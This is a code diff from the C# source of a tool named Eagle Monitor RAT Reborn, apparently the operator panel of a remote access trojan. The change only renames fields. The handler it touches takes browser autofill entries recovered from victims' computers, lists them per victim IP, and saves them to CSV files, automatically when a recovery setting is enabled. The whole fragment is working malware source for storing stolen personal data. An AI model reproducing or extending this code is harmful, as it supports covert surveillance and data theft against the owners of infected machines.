@@ -18,15 +18,15 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
             {
                 try
                 {
-                    if (ClientHandler.ClientHandlersList[autofillPacket.baseIp].clientForm.autofillDataGridView != null)
+                    if (ClientHandler.ClientHandlersList[autofillPacket.BaseIp].ClientForm.autofillDataGridView != null)
                     {
-                        ClientHandler.ClientHandlersList[autofillPacket.baseIp].clientForm.autofillDataGridView.BeginInvoke((MethodInvoker)(() =>
+                        ClientHandler.ClientHandlersList[autofillPacket.BaseIp].ClientForm.autofillDataGridView.BeginInvoke((MethodInvoker)(() =>
                         {
-                            ClientHandler.ClientHandlersList[autofillPacket.baseIp].clientForm.autofillDataGridView.Rows.Clear();
+                            ClientHandler.ClientHandlersList[autofillPacket.BaseIp].ClientForm.autofillDataGridView.Rows.Clear();
                             foreach (object[] str in autofillPacket.autofillList)
                             {
-                                int rowId = ClientHandler.ClientHandlersList[autofillPacket.baseIp].clientForm.autofillDataGridView.Rows.Add();
-                                DataGridViewRow row = ClientHandler.ClientHandlersList[autofillPacket.baseIp].clientForm.autofillDataGridView.Rows[rowId];
+                                int rowId = ClientHandler.ClientHandlersList[autofillPacket.BaseIp].ClientForm.autofillDataGridView.Rows.Add();
+                                DataGridViewRow row = ClientHandler.ClientHandlersList[autofillPacket.BaseIp].ClientForm.autofillDataGridView.Rows[rowId];
                                 row.Cells["Column21"].Value = str[0].ToString();
                                 row.Cells["Column22"].Value = str[1].ToString();
                                 row.Cells["Column23"].Value = str[2].ToString();
@@ -34,14 +34,14 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
                                 row.Cells["Column25"].Value = str[4].ToString();
                             }
                             if (Program.settings.autoSaveRecovery)
-                                Utils.ToCSV(ClientHandler.ClientHandlersList[autofillPacket.baseIp].clientForm.autofillDataGridView, ClientHandler.ClientHandlersList[autofillPacket.baseIp].clientPath + "\\Autofill\\" + Utils.DateFormater() + ".csv");
+                                Utils.ToCSV(ClientHandler.ClientHandlersList[autofillPacket.BaseIp].ClientForm.autofillDataGridView, ClientHandler.ClientHandlersList[autofillPacket.BaseIp].ClientPath + "\\Autofill\\" + Utils.DateFormater() + ".csv");
                             return;
                         }));
                     }
                     else
-                    { Utils.ToCSV(autofillPacket.autofillList, ClientHandler.ClientHandlersList[autofillPacket.baseIp].clientPath + "\\Autofill\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Name", "Autofill", "Date created", "Last date used" }); }
+                    { Utils.ToCSV(autofillPacket.autofillList, ClientHandler.ClientHandlersList[autofillPacket.BaseIp].ClientPath + "\\Autofill\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Name", "Autofill", "Date created", "Last date used" }); }
                 }
-                catch { Utils.ToCSV(autofillPacket.autofillList, ClientHandler.ClientHandlersList[autofillPacket.baseIp].clientPath + "\\Autofill\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Name", "Autofill", "Date created", "Last date used" }); }
+                catch { Utils.ToCSV(autofillPacket.autofillList, ClientHandler.ClientHandlersList[autofillPacket.BaseIp].ClientPath + "\\Autofill\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Name", "Autofill", "Date created", "Last date used" }); }
             }
             else
                 return;
